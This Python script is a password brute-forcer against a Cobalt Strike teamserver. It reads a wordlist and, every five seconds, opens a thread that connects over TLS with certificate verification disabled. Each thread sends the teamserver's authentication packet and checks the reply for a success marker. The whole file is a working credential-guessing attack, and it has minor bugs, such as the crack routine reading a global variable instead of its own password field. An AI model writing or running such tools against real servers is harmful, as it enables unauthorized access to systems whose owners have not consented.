import sys
import ssl
import time
import socket
import _thread

PASSWORD = None

class CobaltStrikeConnector:
    """Connect to the Teamserver of the Cobalt Strike Control Center"""
    def __init__(self):
        """Create a Cobalt Strike Connecter"""
        self.connector = None
        self.sslconnector = None
        self.context = ssl.SSLContext() 
        self.context.verify_mode = ssl.CERT_NONE
    
    def isConnected(self):
        """Check if the client connection has been in the state of established or not"""
        if self.connector or self.sslconnector:
            return True
        else:
            return False
         
    def openConnection(self, hostname, port):
        """Connect to the Cobalt Strike Control Center"""
        self.connector = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connector.settimeout(3)
        self.sslconnector = self.context.wrap_socket(self.connector)
        
        if hostname == socket.gethostname():
            self.sslconnector.connect((socket.gethostbyname_ex(hostname)[2][0], port))
        else:
            self.sslconnector.connect((hostname, port))
            
    def closeConnetion(self):
        """Disconnect the Cobalt Strike Control Center"""
        if self.connector:
            self.connector.close() 
        self.connector = None
        self.sslconnector = None
        
    def dataSend(self, data):
        """Send packet data to the Cobalt Strike Control Center"""
        if not self.sslconnector:
            return False
        try:
            self.sslconnector.sendall(data)
        except Exception as reason:
            return False
        return True
        
    def dataReceive(self):
        if not self.sslconnector:
            raise 
        size = 0
        data = b""
        while size < 4:
            buffer = self.sslconnector.recv()
            data += buffer
            size += len(buffer)
        return data
               
class CobaltStrikeCracker:
    def __init__(self, hostname, port, password):
        self.hostname = hostname
        self.port = port
        self.password = password
        self.connector = CobaltStrikeConnector()
        
    def Crack(self):
        consquence = None
        if(len(self.password) > 0):
            self.connector.openConnection(self.hostname, self.port)
            print("[+] Try new password: " + password)
            data = bytearray(b"\x00\x00\xbe\xef") + len(password).to_bytes(1, "big", signed=True) + bytes(bytes(password, "ascii").ljust(256, b"A"))
            self.connector.dataSend(data)
            if self.connector.isConnected():
                consquence = self.connector.dataReceive()
            if self.connector.isConnected():
                self.connector.closeConnetion()
            if consquence == bytearray(b"\x00\x00\xca\xfe"):
                global PASSWORD
                PASSWORD = password   
        else:
            print("[-] We got password failed")
            
def CrackThread(hostname, port, filename):
    try:
        cracker = CobaltStrikeCracker(hostname, port, filename)
        cracker.Crack()
    except Exception as reason:
        print("[-] Crack Thread Error!")

if __name__ == "__main__":
    hostname = sys.argv[1]
    port = int(sys.argv[2])
    filename = sys.argv[3]
    passwords = []
    with open(filename, 'r') as filereader:
            for line in filereader.readlines():
                line = line.replace("\r", "").replace("\n", "")
                passwords.append(line)
    print("[+] Config Hostname: " + hostname)
    print("[+] Config Service Port:" + str(port))
    print("[+] Loading Passwords File: " + filename)
    for password in passwords:
        _thread.start_new_thread(CrackThread, (hostname, port, password))
        time.sleep(5)
    if PASSWORD != None:
        print("[+] Cracked Succeed! Password:"+str(PASSWORD))          
    else:
        print("[-] Cracked Failed!")
